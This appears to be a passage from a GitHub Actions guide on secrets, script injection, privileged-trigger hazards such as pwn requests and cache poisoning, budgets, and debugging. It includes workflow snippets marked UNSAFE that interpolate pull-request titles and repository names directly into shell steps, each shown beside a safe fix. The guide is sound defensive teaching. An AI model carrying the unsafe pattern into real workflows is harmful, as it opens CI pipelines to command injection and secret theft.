    • Not usable everywhere. Secrets cannot appear in step-level if:, in uses: refs, or in matrix; map to env: first.
    • Variables are plaintext and ideal for endpoints, flags and bucket names via vars.*.
    • Fork and Dependabot runs see no secrets, by design — the usual reason a branch works and a PR does not.

    Injection: where it actually enters

    # UNSAFE — the PR title becomes shell code
- run: echo "Checking ${{ github.event.pull_request.title }}"

# SAFE — the value is data, not code
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $TITLE"

# UNSAFE — attacker controls the filename, so the shell re-parses it
- run: ls ${{ github.event.pull_request.head.repo.name }}/*.txt

# SAFE — quote it, and set -euo pipefail so failures are loud
- shell: bash
  run: |
    set -euo pipefail
    ls -- "$DIR"/*.txt

    The generalisable rule: expressions inside run: are text substitution before the shell parses anything. Anything derived from an event (titles, bodies, branch names, labels, filenames) goes through env: and gets referenced as a quoted variable.

    The privileged-event hazards, in order of severity

    • Pwn requestpull_request_target / workflow_run plus a checkout of the fork's code = attacker code with your token and secrets. Since actions/checkout v7 that specific checkout is refused by default, and the opt-out is named allow-unsafe-pr-checkout. Other routes remain: git fetch of a PR ref inside a run: step, or issue_comment-triggered workflows.
    • Cache poisoningA cache saved by an untrusted run and restored by a privileged one is a delivery mechanism. Keep cache keys trust-scoped; never let a restored cache feed a step that has secrets.
    • Artifact poisoningArtifacts uploaded by a fork-derived run are untrusted input. Validate parsed data; never execute a downloaded artifact.
    • Command injectionInterpolated event data, as above. Also unquoted variables in run: blocks with bash word splitting.
    • Self-hostedA persistent runner on a public repository is the worst combination available; treat it as a deliberate, reviewed decision or not at all.

    Budgets: what they do and do not do

    • DocumentedBudgets are configured on metered products and can be set to alert only or to stop usage when the budget limit is reached. The second is the one that protects you.

    8. Disable workflows you are not using rather than leaving schedules armed.
    9. Move heavy builds to self-hosted if you own a machine; minutes are free there.

    Debugging & Observability — reading the evidence

    Actions gives you four independent records of every run: the job graph, the step logs, the annotations and step summary, and the side effects (commits, deployments, artifacts). When something is wrong, decide which of the four disagrees with your expectation — that choice usually names the culprit.

    Where to look, in order

    LayerWhat it tells youHow to read it well
    Run listWhether it ran at all, which event triggered it, duration, cancellationFilter by event and branch; a schedule run has no actor, which is normal
    Job graphWhich jobs ran, were skipped or cancelled, and in what dependency orderA skipped job in a green run is if: logic working — read the condition before assuming a bug

    Debug levers

    • Step debug loggingSet the repository variable ACTIONS_STEP_DEBUG=true (or re-run with "Enable debug logging"); ACTIONS_RUNNER_DEBUG adds runner-level detail.
    • Interactive shellThere is no SSH into a hosted runner. The workaround is tmate or a long sleep step you cancel manually — a reminder the machine is one-shot.
    • set -euo pipefailThe highest-value line in any pipeline script: failures stop the step instead of sailing past a failed download.
    • Exit codesNon-zero fails the step; continue-on-error converts failure into an outcome you must inspect yourself via steps.x.outcome.
    • Environment dumpsPrint variable names (env | cut -d= -f1), never values — that is how you learn what a run had without leaking a secret.

    Retry, cancel, and the honesty of green

    • Re-run failed jobs keeps successful jobs and retries the failures — cheap, and usually what you want after a flaky network step.
    • Re-run all jobs is a fresh attempt at everything; a run may be re-run at most 50 times.
    • Cancel stops in-flight work; a cancelled job can leave partial side effects, which matters for anything that commits or deploys.
    • Concurrency + cancel-in-progress is the polite version of manual cancelling for PR workflows.
    • Green is not correct. A pipeline that hides failures with || true reports success. Overhead deliberately avoids that: the refresh steps are continue-on-error, and a later step fails the run if their outcome was bad.
